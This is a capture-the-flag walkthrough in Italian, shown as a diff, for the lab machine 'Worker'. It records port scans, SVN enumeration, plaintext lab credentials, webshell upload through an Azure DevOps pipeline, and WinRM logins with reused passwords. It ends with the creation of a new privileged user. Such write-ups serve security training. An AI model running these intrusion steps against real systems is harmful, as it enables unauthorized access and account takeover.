@@ -1,0 +1,311 @@
+10.10.10.203
+
+masscan -p1-65535 --rate 1000 --banners 10.10.10.203 -e tun0
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 3690/tcp on 10.10.10.203                                  
+Discovered open port 80/tcp on 10.10.10.203                                    
+Discovered open port 5985/tcp on 10.10.10.203                                  
+                                                                                                                                                                                                                                              
+┌──(daerves㉿kali)-[~]
+└─$ nmap -sC -sV -p 80,3690,5985 10.10.10.203
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-10 11:47 CET
+Nmap scan report for 10.10.10.203
+Host is up (0.58s latency).
+
+PORT     STATE SERVICE  VERSION
+80/tcp   open  http     Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+3690/tcp open  svnserve Subversion
+5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+sulla porta 80 c'è un sito con la apgina di IIS welcome che rimanda solo al sito ufficiale microsoft iis
+
+
+The svnserve program is a lightweight server, capable of speaking to clients over TCP/IP using a custom, stateful protocol. Clients contact an svnserve server by using URLs that begin with the svn:// or svn+ssh:// scheme. This section will explain the different ways of running svnserve, how clients authenticate themselves to the server, and how to configure appropriate access control to your repositories.
+
+https://svnbook.red-bean.com/en/1.7/svn.serverconfig.svnserve.html
+
+enumerazione con gobuster sulla porta 80:
+
+sudo gobuster  dir -u http://10.10.10.203/ -w /usr/share/wordlists/dirb/big.txt -t 200
+
+/aspnet_client        (Status: 301) [Size: 157] [--> http://10.10.10.203/aspnet_client/]
+                                         
+non trova nulla di interessante
+
+
+provo ad enumerare svnserve:
+
+svn list svn://10.10.10.203/
+dimension.worker.htb/
+moved.txt
+
+svn cat svn://10.10.10.203/moved.txt             
+This repository has been migrated and will no longer be maintaned here.
+You can find the latest version at: http://devops.worker.htb
+
+// The Worker team :)
+
+
+vn list svn://10.10.10.203/dimension.worker.htb/
+LICENSE.txt
+README.txt
+assets/
+images/
+index.html
+
+provo ad aggiungere devops.worker.htb a /etc/hosts e lo stesso faccio per dimension.worker.htb
+
+riesco a connettermi ad entrambi, dimension a sua volta contiene molti altri subdomains (alpha.worker.htb ecc) che aggiungo a /etc/hosts ma non sembrano interessanti
+a devops.worker.htb invece non reisco a connetetrmi perchè mi da 401, richeide quindi autenticazione (basic authentication)
+
+svn log svn://10.10.10.203
+
+------------------------------------------------------------------------
+r5 | nathen | 2020-06-20 15:52:00 +0200(sab, 20 giu 2020) | 1 line
+
+Added note that repo has been migrated
+------------------------------------------------------------------------
+r4 | nathen | 2020-06-20 15:50:20 +0200(sab, 20 giu 2020) | 1 line
+
+Moving this repo to our new devops server which will handle the deployment for us
+------------------------------------------------------------------------
+r3 | nathen | 2020-06-20 15:46:19 +0200(sab, 20 giu 2020) | 1 line
+
+-
+------------------------------------------------------------------------
+r2 | nathen | 2020-06-20 15:45:16 +0200(sab, 20 giu 2020) | 1 line
+
+Added deployment script
+------------------------------------------------------------------------
+r1 | nathen | 2020-06-20 15:43:43 +0200(sab, 20 giu 2020) | 1 line
+
+First version
+------------------------------------------------------------------------
+
+
+svn checkout svn://10.10.10.203                       //Download the repository
+svn up -r 2                     //magari riesco a vedere il deployment script
+
+deployment script:
+
+$user = "nathen" 
+$plain = "wendel98"
+$pwd = ($plain | ConvertTo-SecureString)
+$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
+$args = "Copy-Site.ps1"
+Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")
+
+c'è una pwd per il server in plain text
+
+nathen:wendel98
+
+queste credenziali potrebbero essere utili per acceder alla macchina per il deployment o se c'è password reuse
+
+provo ad usarle per accedere a devops.worker.htb
+infatti riesco ad entrare e sono in un sito azure devops
+
+
+controllando le pipelines vedo che copiano tutti i file in un merge sotto la directory:
+
+w:\sites\$(Build.Repository.Name).worker.htb
+
+questo significa che se riesco a caricare una web shell (o una reverse shell) in un commit e poi a fare il merge dovrei riuscire a farla comparire in uno dei subdomains 
+e da li avere una shell da sfruttare
+
+prima cosa devo fare clone e pull della repository (ad esempio quella di spectre.worker.htb)
+
+posso farlo diretrtamente dalla pagina di azure web-ops:
+
+1) crea un nuovo branch (perchè non si può caricare file direttamente in master)
+2) carica file
+3) o si crea una pull request per mergiare dentro master ( e triggerare una build automatica) oppure si fa partire una build su quel branch specifico 
+
+a questo punto andando a http://spectral.worker.htb/cmdasp.aspx
+si ha una webshell
+
+
+whoami:
+iis apppool\defaultapppool
+
+id:
+uid=4294967295(Unknown+User) gid=4294967295(Unknown+Group)
+
+
+è uno user che appartiene alla pipeline probabilmente, non uno user specifico del sistema
+
+pwd:
+
+/c/windows/system32/inetsrv
+
+sono nel drive c ma in azure devops si faceva riferimento a un drive w
+per controllare che dirve sono montati uso wmic 
+
+wmic logicaldisk get deviceid, volumename, description
+
+in effetti ci sono due disk montati:
+
+Description       DeviceID  VolumeName  
+
+Local Fixed Disk  C:                    
+
+Local Fixed Disk  W:        Work
+
+dir w:\
+
+ Volume in drive W is Work
+ Volume Serial Number is E82A-AEA8
+
+ Directory of w:\
+
+2020-06-16  17:59    <DIR>          agents
+2020-03-28  14:57    <DIR>          AzureDevOpsData
+2020-04-03  10:31    <DIR>          sites
+2020-06-20  15:04    <DIR>          svnrepos
+
+type w:\svnrepos\www\conf\passwd
+
+### This file is an example password file for svnserve.
+### Its format is similar to that of svnserve.conf. As shown in the
+### example below it contains one section labelled [users].
+### The name and password for each user follow, one account per line.
+
+[users]
+nathen = wendel98
+nichin = fqerfqerf
+nichin = asifhiefh
+noahip = player
+nuahip = wkjdnw
+oakhol = bxwdjhcue
+owehol = supersecret
+paihol = painfulcode
+parhol = gitcommit
+pathop = iliketomoveit
+pauhor = nowayjose
+payhos = icanjive
+perhou = elvisisalive
+peyhou = ineedvacation
+phihou = pokemon
+quehub = pickme
+quihud = kindasecure
+rachul = guesswho
+raehun = idontknow
+ramhun = thisis
+ranhut = getting
+rebhyd = rediculous
+reeinc = iagree
+reeing = tosomepoint
+reiing = isthisenough
+renipr = dummy
+rhiire = users
+riairv = canyou
+ricisa = seewhich
+robish = onesare
+robisl = wolves11
+robive = andwhich
+ronkay = onesare
+rubkei = the
+rupkel = sheeps
+ryakel = imtired
+sabken = drjones
+samken = aqua
+sapket = hamburger
+sarkil = friday
+
+
+potrebbe esserci qualche pwd corretta all'interno
+quella nathen è corertta quindi potrebbe esserci qualche altro user che ha la pwd corretta
+
+
+ Directory of c:\users
+
+2020-07-07  16:53    <DIR>          .
+2020-07-07  16:53    <DIR>          ..
+2020-03-28  14:59    <DIR>          .NET v4.5
+2020-03-28  14:59    <DIR>          .NET v4.5 Classic
+2020-08-17  23:33    <DIR>          Administrator
+2020-03-28  14:01    <DIR>          Public
+2020-07-22  00:11    <DIR>          restorer
+2020-07-08  18:22    <DIR>          robisl
+               0 File(s)              0 bytes
+               8 Dir(s)  10ÿ445ÿ058ÿ048 bytes free
+
+robisl è presente sulla macchina e in questo file la sua pwd è 
+
+robisl:wolves11
+
+per controllare che sia possibile accedere all'utente tramite WinRM eseguo:
+
+net user robisl
+
+User name                    robisl
+Full Name                    Robin Islip
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            2020-04-05 20:27:26
+Password expires             Never
+Password changeable          2020-04-05 20:27:26
+Password required            No
+User may change password     No
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   2020-08-03 11:41:02
+
+Logon hours allowed          All
+
+Local Group Memberships      *Production           *Remote Management Use
+Global Group memberships     *None                 
+
+
+ottengo le info dell'utente quindi pèuò accedere con WinRM
+per ottenre una shell uso evilwinrm
+
+evil-winrm -i 10.10.10.203 -u robisl -p wolves11
+
+(si poteva anche usare tutto il file trovato dividendolo in due file, uno con tutte le pwd e uno con tutti gli user)
+
+C:\Users\robisl\Desktop> type user.txt
+082ac3ea637e4037d655785cbb3dc5d0
+
+
+non vedo path di priv esc 
+però visto che nel file c'erano le credenziali per accedere ad azure devops provo ad entrare anche con utente robisl
+
+c'è un progetto diverso nella home ma non sembrano esserci files interessanti
+
+l'account con cui sono entrato però può creare una nuova pipeline e far eseguire dei comandi
+Ispezionando i workers troviamo che il worker Hamilton11 (come probabilmente tutti gli altri) ha capabilities di Administrator:
+
+Cmd     C:\Windows\system32\cmd.exe
+
+InteractiveSession        False                     //fors enon ci permetterà di creare una shell ?? conviene leggere direttamente il file di root.txt oppure far creare un utente e accedere con quel nuovo utente tramite winrm
+
+ho creato un nuovo utente:
+
+cube:Password123!
+
+posso entrare con evil-winrm
+
+evil-winrm -i 10.10.10.203 -u cube -p Password123!
+
+
+
+
+
+
+
+
